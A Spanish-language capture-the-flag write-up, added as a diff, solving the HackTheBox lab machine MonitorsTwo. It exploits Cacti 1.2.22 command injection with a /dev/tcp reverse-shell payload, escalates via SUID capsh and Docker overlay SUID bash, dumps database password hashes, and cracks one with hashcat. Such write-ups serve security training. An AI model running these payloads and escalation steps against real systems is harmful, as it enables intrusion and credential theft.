@@ -1,0 +1,395 @@
+---
+description: >-
+  MonitorsTwo es una máquina Linux de dificultad fácil que muestra una variedad
+  de vulnerabilidades y configuraciones incorrectas.
+cover: ../../../../.gitbook/assets/monitorstwo-htb.jpeg
+coverY: 0
+---
+
+# MonitorsTwo
+
+## Informacion General
+
+* **IP de la máquina**: 10.10.11.211
+* **Sistema Operativo**: Linux
+* **Dificultad**: Facil
+* **Keywords**:
+  * Docker
+  * Contenedores
+  * SUID
+  * CVE-2021-41091
+  * CVE-2022-46169
+
+
+
+## User Flag
+
+### Escaneo de puertos
+
+```
+$ sudo nmap -sC -T5 -Pn 10.10.11.211 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 12:17 EST
+Nmap scan report for 10.10.11.211
+Host is up (0.23s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http
+|_http-title: Login to Cacti
+
+Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
+```
+
+### Enumeracion del servicio web
+
+El servicio web esta ejecutando Cacti v1.2.22 el cual posee una vulnerabilidad RCE.
+
+```
+$ curl -s http://10.10.11.211/index.php | grep -o "cactiVersion.*;"
+cactiVersion='1.2.22';
+
+$ searchsploit cacti 1.2.22
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Cacti v1.2.22 - Remote Command Execution (RCE)                                     | php/webapps/51166.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+### Explotando la vulnerabilidad CVE-2022-46169 (Cacti v1.2.22)
+
+Cacti v1.2.22 posee una vulnerabilidad RCE debido a la falta de saneamiento en el archivo remote\_agent.php en la funcion poll\_for\_data()
+
+```php
+Codigo extraido de la pagina oficial de Cacti en github. 'https://github.com/Cacti/cacti'
+Estos son los fragmentos de codigos relevantes donde se aprecia la vulnerabilidad.
+<?php
+
+/* 
+ * Una de las principales fallas se encuentra en esta funcion.
+ * Esta funcion se encarga de retornar la variable de la solicitud HTTP
+ * sin aplicarle ningun filtro, asi por ejemplo cuando se solicita el valor de 
+ * poller_id, no se le aplica ningun filtro a pesar de que este pueda contener codigo
+ * maligno.
+ */
+function get_nfilter_request_var($name, $default = '') {
+	global $_CACTI_REQUEST;
+	if (isset($_CACTI_REQUEST[$name])) {
+		return $_CACTI_REQUEST[$name];
+	} elseif (isset($_REQUEST[$name])) {
+		return $_REQUEST[$name];
+	} else {
+		return $default;
+	}
+}
+
+// codigo sin corregir
+$local_data_ids = get_nfilter_request_var('local_data_ids');
+$host_id        = get_filter_request_var('host_id');
+$poller_id      = get_nfilter_request_var('poller_id'); // en $poller_id se aloja el payload 
+$return         = array();
+if (function_exists('proc_open')) {
+    /* 
+     * La funcion proc_open sirve para ejecutar comandos del sistema de forma asincrona, sin embargo
+     * lo importante radica en que como no se le aplicaron filtros ni se realizo un escapeshellargs a la variable poller_id
+     * dicha variable se esta pasando directo sin sanear a la funcion proc_open, por lo que lo unico que tendrian que agregar es 
+     * un payload tipo "1; whoami" para ejecutar codigo
+     */
+	$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);
+    $output = fgets($pipes[1], 1024);
+	$using_proc_function = true;
+} else { 
+}
+
+```
+
+Con la informacion anterior, se puede desarrollar un exploit para ejecutar comandos de forma remota, simplemente se debe encontrar un LOCAL\_DATA\_ID y un HOST\_ID valido realizando un fuzzing a la siguiente ruta:
+
+```
+/remote_agent.php?action=polldata&local_data_ids[]=$FUZZ$&host_id=$FUZZ$&poller_id=669
+```
+
+Este proceso se realiza hasta obtener un resultado como el siguiente:
+
+```
+[{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
+```
+
+Para automatizar el proceso de fuzzing y envio del payload, hicé un script `cacti_1.2.22_exploit.py` el cuál puede ser revisado en mi repositorio de github (https://github.com/mind2hex/HackTheBox/Machines/Linux/MonitorsTwo).
+
+```bash
+# TERMINAL 1 iniciando el listener
+nc -lvnp 1234  
+listening on [any] 1234 ...
+
+# TERMINAL 2 ejecutando el script
+python3 cacti_1.2.22_exploit.py http://10.10.11.211/ "bash -c 'exec bash -i &>/dev/tcp/10.10.16.2/1234 <&1'"
+1 6
+[!] Sending payload: 669%3Bbash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/10.10.16.2/1234%20%3C%261%27
+
+# TERMINAL 1 recibiendo la conexion
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.211] 47748
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@50bca5e748b0:/var/www/html$ 
+```
+
+### Escalación de privilegios en el contenedor
+
+Al momento de obtener una shell, se procedió a cargar el script `linpeas.sh` para la enumeracion local.
+
+```bash
+# La shell se esta ejecutando adentro de un contenedor
+╔══════════╣ Unexpected in root   
+/.dockerenv
+/entrypoint.sh
+
+# el binario capsh nos permite escalar privilegios
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strace Not Found
+-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh  # ./capsh --gid=0 --uid=0 --
+-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
+```
+
+La enumeración realizada por `linpeas.sh` indica que la shell se esta ejecutando en un contenedor, ademas de esto tambien existe un binario con SUID el cual nos permite escalar privilegios facilmente.
+
+```bash
+www-data@50bca5e748b0:/sbin$ /sbin/capsh --gid=0 --uid=0 --
+/sbin/capsh --gid=0 --uid=0 --
+
+whoami
+root
+```
+
+### Extracción y crackeo de hashes
+
+Si leemos el contenido de `/entrypoint.sh` podremos observar unas cuantas instrucciones que se ejecutan en una base de datos llamada `cacti`.
+
+```bash
+cat /entrypoint.sh
+-----------------------
+#!/bin/bash
+set -ex
+
+wait-for-it db:3306 -t 300 -- echo "database is connected"
+if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
+    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
+    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
+    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
+fi
+
+chown www-data:www-data -R /var/www/html
+# first arg is `-f` or `--some-option`
+if [ "${1#-}" != "$1" ]; then
+	set -- apache2-foreground "$@"
+fi
+-----------------------
+```
+
+Podemos utilizar la información anterior para ejecutar comandos en la base de datos de la siguiente forma:
+
+```bash
+mysql --host=db --user=root --password=root cacti -e "show TABLES;"
+...
+user_auth
+user_auth_cache
+user_auth_group
+user_auth_group_members
+user_auth_group_perms
+user_auth_group_realm
+user_auth_perms
+user_auth_realm
+user_domains
+user_domains_ldap
+user_log
+...
+
+mysql --host=db --user=root --password=root cacti -e "SELECT username, password FROM user_auth;"
+username	password
+admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
+guest	43e9a4ab75570f5b
+marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+```
+
+Utilizando `hashcat` junto con el diccionario `rockyou.txt` se puede crackear el hash de marcus para iniciar sesion vía SSH.
+
+```bash
+$ hashcat -a 0 -m 3200 '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C' /usr/share/wordlists/rockyou.txt  --show
+$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
+
+$ ssh marcus@10.10.11.211       
+marcus@10.10.11.211's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 27 Sep 2023 10:11:37 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       63.0% of 6.73GB
+  Memory usage:                     17%
+  Swap usage:                       0%
+  Processes:                        229
+  Users logged in:                  0
+  IPv4 address for br-60ea49c21773: 172.18.0.1
+  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.211
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:22a1
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+You have mail.
+Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
+marcus@monitorstwo:~$ cat user.txt
+d9947b0eae40f1554a10eda3b4035f08
+```
+
+## Root Flag
+
+### Enumeración básica
+
+Al iniciar sesian via SSH, en el banner, aparece que el usuario marcus tiene correo, por lo tanto se debe inspeccionar el archivo `/var/mail/marcus`.
+
+```
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+
+Dear all,
+
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
+```
+
+En este archivo se expone que en el sistema existen varias vulnerabilidades, sin embargo para no alargar mas el write up, explotaremos la vulnerabilidad CVE-2021-41091.
+
+### Explotando la vulnerabilidad CVE-2021-41091
+
+Esta vulnerabilidad en Moby (Docker Engine), le permite a usuarios no autorizados en la maquina ejecutar, leer o modificar archivos adentro del directorio donde se almacenan los archivos de contenedor (`/var/lib/docker/...xyz/merged/`). Esto quiere decir que si un usuario privilegiado adentro del contenedor modifica un binario como SUID, entonces se podria usar para escalar privilegios por otros usuarios de la maquina usando la ruta /var/lib/docker/...xyz/merged/bin. Para lograr esto primero hay que localizar el directorio donde se localizan los archivos del contenedor.
+
+```
+marcus@monitorstwo:~$ findmnt
+TARGET                                SOURCE     FSTYPE     OPTIONS
+/                                     /dev/sda2  ext4       rw,relatime
+├─/sys                                sysfs      sysfs      rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/kernel/security              securityfs securityfs rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/cgroup                    tmpfs      tmpfs      ro,nosuid,nodev,noexec,mode=755
+│ │ ├─/sys/fs/cgroup/unified          cgroup2    cgroup2    rw,nosuid,nodev,noexec,relatime,nsdelegate
+│ │ ├─/sys/fs/cgroup/systemd          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
+│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
+│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
+│ │ ├─/sys/fs/cgroup/blkio            cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,blkio
+│ │ ├─/sys/fs/cgroup/pids             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,pids
+│ │ ├─/sys/fs/cgroup/memory           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,memory
+│ │ ├─/sys/fs/cgroup/rdma             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,rdma
+│ │ ├─/sys/fs/cgroup/perf_event       cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,perf_event
+│ │ ├─/sys/fs/cgroup/cpuset           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpuset
+│ │ ├─/sys/fs/cgroup/hugetlb          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,hugetlb
+│ │ ├─/sys/fs/cgroup/freezer          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,freezer
+│ │ └─/sys/fs/cgroup/devices          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,devices
+│ ├─/sys/fs/pstore                    pstore     pstore     rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/bpf                       none       bpf        rw,nosuid,nodev,noexec,relatime,mode=700
+│ ├─/sys/kernel/debug                 debugfs    debugfs    rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/kernel/tracing               tracefs    tracefs    rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/fuse/connections          fusectl    fusectl    rw,nosuid,nodev,noexec,relatime
+│ └─/sys/kernel/config                configfs   configfs   rw,nosuid,nodev,noexec,relatime
+├─/proc                               proc       proc       rw,nosuid,nodev,noexec,relatime
+│ └─/proc/sys/fs/binfmt_misc          systemd-1  autofs     rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,
+├─/dev                                udev       devtmpfs   rw,nosuid,noexec,relatime,size=1966932k,nr_inodes=491733,
+│ ├─/dev/pts                          devpts     devpts     rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
+│ ├─/dev/shm                          tmpfs      tmpfs      rw,nosuid,nodev
+│ ├─/dev/hugepages                    hugetlbfs  hugetlbfs  rw,relatime,pagesize=2M
+│ └─/dev/mqueue                       mqueue     mqueue     rw,nosuid,nodev,noexec,relatime
+├─/run                                tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=402612k,mode=755
+│ ├─/run/lock                         tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=5120k
+│ ├─/run/docker/netns/97be01a456dd    nsfs[net:[4026532571]]
+│ │                                              nsfs       rw
+│ ├─/run/user/1000                    tmpfs      tmpfs      rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,g
+│ └─/run/docker/netns/1648f9f8ef92    nsfs[net:[4026532632]]
+│                                                nsfs       rw
+├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4
+├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM
+└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
+marcus@monitorstwo:~$ 
+```
+
+En el resultado anterior se observan dos rutas asi que vamos a crear un archivo de pruebas desde el contenedor
+
+```
+# CONTENEDOR: creando archivo en el directorio raiz como usuario root (/)
+touch /testing
+
+# MARCUS: mostrando el contenido del directorio docker
+marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+bin   dev            etc   lib    media  opt   root  sbin  sys      tmp  var
+boot  entrypoint.sh  home  lib64  mnt    proc  run   srv   testing  usr
+
+# CONTENEDOR: modificando el binario bash para que sea SUID
+chmod u+s /bin/bash
+
+# MARCUS: escalando privilegios usando el binario SUID
+marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/
+.bash_history  .cache/        .local/        root.txt       
+.bashrc        cacti/         .profile       .ssh/          
+bash-5.1# cat /root/root.txt
+1ec867772e1fd89d38388f00a75ee04c
+bash-5.1# 
+```
+
+## Referencias
+
+* [Repositorio de Cacti](https://github.com/Cacti/cacti)
+* [Mind2hex github repo](https://github.com/mind2hex/HackTheBox/tree/master/Machines/Linux/MonitorsTwo)
+* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+* [CVE-2021-41091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41091)
+* [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)
